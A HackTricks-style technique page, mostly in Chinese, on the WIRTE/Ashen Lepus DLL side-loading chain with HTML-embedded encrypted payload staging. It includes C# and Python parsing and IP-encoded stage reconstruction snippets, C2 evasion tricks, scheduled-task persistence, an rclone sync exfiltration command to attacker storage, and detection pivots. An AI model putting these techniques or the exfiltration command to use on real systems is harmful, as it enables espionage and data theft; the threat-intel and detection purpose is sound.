# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft 概述

Ashen Lepus（又名 WIRTE）将 DLL sideloading、staged HTML payloads 和模块化 .NET backdoors 串联成一种可重复使用的模式，从而在中东外交网络中实现持久化。任何 operator 都可以复用该技术，因为它依赖于：<sup>[[1]](#references)</sup>

- **基于 Archive 的 social engineering**：无害的 PDF 指示目标从 file-sharing site 下载 RAR archive。该 archive 包含一个外观真实的文档查看器 EXE、一个以受信任 library 命名的 malicious DLL（例如 `netutils.dll`、`srvcli.dll`、`dwampi.dll`、`wtsapi32.dll`），以及一个诱饵文件 `Document.pdf`。
- **滥用 DLL search order**：受害者双击 EXE 后，Windows 从当前目录解析 DLL import，malicious loader（AshenLoader）便在受信任进程内执行，同时打开诱饵 PDF 以避免引起怀疑。
- **Living-off-the-land staging**：后续每个 stage（AshenStager → AshenOrchestrator → modules）都只在需要时保留在内存中，具体通过隐藏在其他无害 HTML 响应中的 encrypted blobs 进行传输。

## Multi-Stage Side-Loading 链

1. **Decoy EXE → AshenLoader**：EXE side-load AshenLoader，后者执行 host recon，对其进行 AES-CTR 加密，并将其放入 `token=`、`id=`、`q=` 或 `auth=` 等轮换参数中，通过类似 API 的路径（例如 `/api/v2/account`）发送 POST 请求。<sup>[[1]](#references)</sup>
2. **HTML extraction**：只有当 client IP 的 geolocation 位于目标区域，且 `User-Agent` 与 implant 匹配时，C2 才会泄露下一个 stage，从而干扰 sandboxes。检查通过后，HTTP body 会包含一个 `<headerp>...</headerp>` blob，其中存放 Base64/AES-CTR encrypted AshenStager payload。
3. **Second sideload**：AshenStager 借助另一个 import `wtsapi32.dll` 的 legitimate binary 进行部署。注入该 binary 的 malicious copy 会获取更多 HTML，这次通过提取 `<article>...</article>` 来恢复 AshenOrchestrator。
4. **AshenOrchestrator**：一个模块化的 .NET controller，用于解码 Base64 JSON config。config 中的 `tg` 和 `au` 字段会被拼接并进行 hash，生成 AES key，用于解密 `xrk`。生成的 bytes 会作为之后获取的每个 module blob 的 XOR key。
5. **Module delivery**：每个 module 都通过 HTML comments 进行描述，这些 comments 会将 parser 重定向到任意 tag，从而绕过只查找 `<headerp>` 或 `<article>` 的 static rules。modules 包括 persistence（`PR*`）、uninstallers（`UN*`）、reconnaissance（`SN`）、screen capture（`SCT`）和 file exploration（`FE`）。

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
即使防御方阻止或剥离某个特定元素，操作员也只需更改 HTML 注释中提示的标签即可恢复投递。<sup>[[1]](#references)</sup>

### Quick Extraction Helper (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

近期的 HTML smuggling 研究（Talos）强调了这样一种方式：将 payload 隐藏为 HTML 附件中 `<script>` 块内的 Base64 字符串，并在运行时通过 JavaScript 解码。<sup>[[2]](#references)</sup> 同样的技巧也可用于 C2 响应：将加密 blob 放入 script tag（或其他 DOM 元素）中，并在内存中先进行解码，再执行 AES/XOR，使页面看起来像普通 HTML。Talos 还展示了 script tag 内的分层混淆（标识符重命名，加上 Base64/Caesar/AES），这可以直接应用于 HTML-staged C2 blob。<sup>[[2]](#references)</sup> Talos 后续关于 **hidden text salting** 的文章在这里同样具有参考价值：使用无关的 HTML 注释或空白拆分 Base64，就足以破坏简单的正则提取器，同时浏览器端的重组仍然非常简单。<sup>[[7]](#references)</sup>

## Recent Variant Notes (2024-2025)

- Check Point 观察到，2024 年的 WIRTE campaigns 仍然依赖基于 archive 的 sideloading，但使用 `propsys.dll`（stagerx64）作为第一阶段。该 stager 使用 Base64 + XOR（密钥为 `53`）解码下一个 payload，使用硬编码的 `User-Agent` 发送 HTTP 请求，并提取嵌入 HTML 标签之间的加密 blob。在其中一个分支中，该 stage 由一长串嵌入的 IP 字符串重建而成，这些字符串通过 `RtlIpv4StringToAddressA` 解码，随后拼接为 payload 字节。<sup>[[3]](#references)</sup>
- OWN-CERT 记录了更早期的 WIRTE tooling：其中被 side-load 的 `wtsapi32.dll` dropper 使用 Base64 + TEA 保护字符串，并将 DLL 名称本身用作解密密钥；随后，该 dropper 在将主机识别数据发送至 C2 之前，先通过 XOR/Base64 对其进行混淆。<sup>[[4]](#references)</sup>

## Reconstructing IP-Encoded Stages

WIRTE 的 2024 年 `propsys.dll` 分支表明，下一个 PE 不必以一个连续的 HTML blob 存在。loader 可以将 stage 字节保存为 dotted-quad 字符串，并使用 `RtlIpv4StringToAddressA` 重新构建，这种模式与 Hive 的 **IPfuscation** tradecraft 密切相关。<sup>[[3]](#references)[[5]](#references)</sup> 从实际操作角度看，当 actor 希望 HTML 页面包含看似无害的 IOC 或配置数据，而不是明显的 Base64 payload 时，这种方式非常有用。
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
如果恢复出的字节以 `MZ` 开头，则很可能已经直接重构出了下一个 PE。如果不是，请检查是否存在前导 XOR/Base64 层，或地址之间是否插入了小型分隔符数据块。

## 可替换的 DLL 名称与主机轮换

这种模式的一个重要特性是，**HTML/AES/XOR staging backend 可以保持不变，只需更换 sideload pair**。在不同 campaign 中，WIRTE 曾轮换使用 `netutils.dll`、`srvcli.dll`、`dwampi.dll`、`wtsapi32.dll` 和 `propsys.dll`，这很有用，因为：<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` 和 `wtsapi32.dll` 都是普通的 Windows DLL 名称，defenders 预期它们会存在于 `%System32%` / `%SysWOW64%` 中。
- **HijackLibs** 等公开 catalog 已经映射了许多会从复制的 application directory 加载这些 DLL 名称的 binaries，为 operators 提供了无需重新设计 stager 的替代 hosts。
- 每个 host 只需调整 export surface。HTML parser、AES/XOR routines 和 module loader 通常都可以原样移植到 forwarding proxy DLL 中。

对于 offensive lab work，这意味着可以将问题拆分为 **(1) 找到一个稳定的 signed host，使其在本地解析所选 DLL 名称**，以及 **(2) 在该 DLL 后复用相同的 staged-HTML loader logic**。

## Crypto 与 C2 加固

- **全程使用 AES-CTR**：当前 loaders 会嵌入 256-bit keys 和 nonces（例如 `{9a 20 51 98 ...}`），并可选地在解密前后使用 XOR layer，使用的 strings 例如 `msasn1.dll`。<sup>[[1]](#references)</sup>
- **Key material variations**：早期 loaders 使用 Base64 + TEA 保护 embedded strings，解密 key 则由 malicious DLL name（例如 `wtsapi32.dll`）派生。<sup>[[4]](#references)</sup>
- **Infrastructure split + subdomain camouflage**：staging servers 按 tool 分离，部署在不同 ASN 中，有时还会置于看似 legitimate 的 subdomains 后方，因此暴露一个 stage 不会牵连其余部分。
- **Recon smuggling**：当前枚举的数据还包括 Program Files listings，以发现高价值 apps，并且在离开 host 前始终经过加密。
- **URI churn**：query parameters 和 REST paths 会在不同 campaigns 之间轮换（`/api/v1/account?token=` → `/api/v2/account?auth=`），使脆弱的 detections 失效。
- **User-Agent pinning + safe redirects**：C2 infrastructure 只响应精确匹配的 UA strings，否则会 redirect 到 benign news/health sites，以融入正常流量。
- **Gated delivery**：servers 会实施 geo-fencing，并且只响应真实 implants。未经批准的 clients 会收到不引人怀疑的 HTML。

## Persistence 与 Execution Loop

AshenStager 会创建伪装成 Windows maintenance jobs 的 scheduled tasks，并通过 `svchost.exe` 执行，例如：<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

这些 tasks 会在 boot 时或按时间间隔重新启动 sideloading chain，确保 AshenOrchestrator 可以请求新的 modules，而无需再次接触 disk。

## 使用 Benign Sync Clients 进行 Exfiltration

Operators 会通过 dedicated module 将 diplomatic documents 暂存到 `C:\Users\Public`（所有用户可读取且不引人怀疑），然后下载 legitimate [Rclone](https://rclone.org/) binary，将该 directory 与 attacker storage 进行同步。Unit42 指出，这是首次观察到该 actor 使用 Rclone 进行 exfiltration，也符合滥用 legitimate sync tooling、使流量融入正常 traffic 的更广泛趋势：<sup>[[1]](#references)</sup>

1. **Stage**：将 target files 复制/收集到 `C:\Users\Public\{campaign}\`。
2. **Configure**：提供一个 Rclone config，将其指向 attacker-controlled HTTPS endpoint（例如 `api.technology-system[.]com`）。
3. **Sync**：运行 `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet`，使 traffic 看起来像正常的 cloud backups。

由于 Rclone 被广泛用于 legitimate backup workflows，defenders 必须重点关注 anomalous executions（new binaries、异常的 remotes，或突然同步 `C:\Users\Public`）。

## Detection Pivots

- 针对**signed processes** 意外从 user-writable paths 加载 DLL 的情况发出 alert（使用 Procmon filters + `Get-ProcessMitigation -Module`），尤其当 DLL names 与 `netutils`、`srvcli`、`dwampi`、`wtsapi32` 或 `propsys` 重叠时。<sup>[[6]](#references)</sup>
- 检查可疑 HTTPS responses，寻找嵌入 unusual tags 的**大型 Base64 blobs**，或由 `<!-- TAG: <xyz> -->` comments 保护的内容。
- 首先对 HTML 进行 normalize：在进行 Base64 extraction 前**移除 comments 并合并 whitespace**，因为 hidden-text-salting 风格的 evasion 可能会将 payload 拆分到 comment boundaries 之间。
- 将 HTML hunting 扩展到 `<script>` blocks 内的 **Base64 strings**（HTML smuggling-style staging），这些 strings 会在 AES/XOR processing 前通过 JavaScript 解码。
- Hunt for **`RtlIpv4StringToAddressA` 后紧接 buffer assembly 的重复调用**，尤其当周围的 strings 是较长的 IPv4 lists，而非真实的 network targets 时。
- Hunt for **执行 `svchost.exe` 且使用非 service arguments，或指向 dropper directories 的 scheduled tasks**。
- 跟踪 **C2 redirects**：它们只会为精确匹配的 `User-Agent` strings 返回 payload，否则会跳转到 legitimate news/health domains。
- 监控 **Rclone** binaries 出现在 IT-managed locations 之外、出现新的 `rclone.conf` files，或从 `C:\Users\Public` 等 staging directories 拉取数据的 sync jobs。

## References

- [1] [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Seasoning email threats with hidden text salting](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)

{{#include ../../../banners/hacktricks-training.md}}
